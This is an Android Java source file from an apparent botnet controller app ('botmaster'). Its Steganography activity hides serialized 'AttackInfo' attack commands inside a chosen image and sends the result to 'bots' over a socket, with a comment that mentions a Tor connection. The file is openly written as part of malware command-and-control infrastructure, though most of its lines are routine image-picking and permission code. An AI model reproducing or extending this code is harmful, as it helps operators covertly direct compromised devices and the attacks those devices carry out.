package com.example.botmaster.steganography;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.provider.DocumentsContract;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import com.example.botmaster.Images;
import com.example.botmaster.MainActivity;
import com.example.botmaster.AttackInfo;
import com.example.botmaster.R;
import com.example.botmaster.SenderAsync;

import java.io.File;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class Steganography extends AppCompatActivity implements AfterEncoding, Serializable
{
    private static final int SELECT_PICTURE = 100;
    private static final String TAG = "Encode Class";
    private TextEncoding textEncoding;
    private Uri filepath;
   // private ServerSocket sok;
    private ObjectOutputStream objectOutputStream;
    //Bitmaps
    private Bitmap original_image;
    private ImageView imageView;
    private Button chooser,ok;
    private File baseImage;
    private int k=0;
    private Images imageSteganography;
    private AttackInfo attackInfo;
    private Context c;
    private Intent intent;
    private ServerSocket serverSocket = null;
    private Socket socket = null;



    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_steganography);
        String filename = "DataFile.txt";
        c = getApplication();
        Activity op = new Activity();
        imageView = (ImageView) findViewById(R.id.imageChooser);
        chooser = (Button) findViewById(R.id.Chooser);
        intent = getIntent();

        attackInfo = (AttackInfo)intent.getSerializableExtra("Attack");
        socket=MainActivity.getSocket();

        Log.e("Socket",""+MainActivity.getSocket());
        chooser.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View v)
            {
                checkAndRequestPermissions();

                if(k==0 || k==1)
                {
                    ActivityCompat.requestPermissions(Steganography.this,new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},1);
                    ImageChooser();
                    k=1;
                }
                else
                {
                    Toast.makeText(getApplicationContext(), "Select an image", Toast.LENGTH_LONG).show();
                }
            }
        });

        ok = (Button) findViewById(R.id.StegOK);

        ok.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View v) {
                Log.e("Steganography","baseImage="+baseImage);

                if(baseImage!=null )
                {
                    //ImageSteganography Object instantiation
                    imageSteganography = new Images(attackInfo.toString(), " ", original_image);
                    //TextEncoding object Instantiation
                    textEncoding = new TextEncoding(Steganography.this,Steganography.this);
                    //Executing the encoding
                    textEncoding.execute(imageSteganography);
                }
            }
        });
    }

    void ImageChooser(){
        Intent intent = new Intent();
        intent.setType("image/*");
        intent.setAction(Intent.ACTION_GET_CONTENT);
        startActivityForResult(Intent.createChooser(intent, "Select Picture"), SELECT_PICTURE);
    }

    public String getPath(Uri uri)
    {
        String filePath = "";
        String wholeID = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT)
        {
            wholeID = DocumentsContract.getDocumentId(uri);
        }
        // Split at colon, use second item in the array
        String id = wholeID.split(":")[1];

        String[] column = { MediaStore.Images.Media.DATA };

        // where id is equal to
        String sel = MediaStore.Images.Media._ID + "=?";

        Cursor cursor = this.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                column, sel, new String[]{ id }, null);

        int columnIndex = cursor.getColumnIndex(column[0]);

        if (cursor.moveToFirst())
        {
            filePath = cursor.getString(columnIndex);
        }
        cursor.close();
        return filePath;
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if (resultCode == Activity.RESULT_OK && data!=null)
        {
            String realPath;
            realPath = getPath(data.getData());

            try
            {
                Uri selected=data.getData();
                final InputStream image=getContentResolver().openInputStream(selected);
                original_image = BitmapFactory.decodeStream(image);
                imageView.setImageBitmap(original_image);
                //selectedImagePath = getPath(selected);
                Log.e("selImagePath",realPath);
                baseImage = new File(realPath);
            }
            catch(Exception ex)
            {
                ex.printStackTrace();
            }
        }
    }

    private void checkAndRequestPermissions()
    {
        int permissionWriteStorage = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int ReadPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        List<String> listPermissionsNeeded = new ArrayList<>();

        if (ReadPermission != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (permissionWriteStorage != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 1);
        }
    }

    @Override
    public void finisher(Images images)
    {
        final Bitmap imagetoSend = images.getEncoded_image(); //converts the encoded image to bitmap object

        /* Initialize Tor Connection with bots*/
        try
        {
            senderFunction(imagetoSend);

        }
        catch (Exception ex)
        {
            ex.printStackTrace();
        }

      //  startActivity(new Intent(Steganography.this, MainActivity.class));
    }

    public void senderFunction(Bitmap currentImage)
    {
        new SenderAsync().execute(currentImage);
    }
}
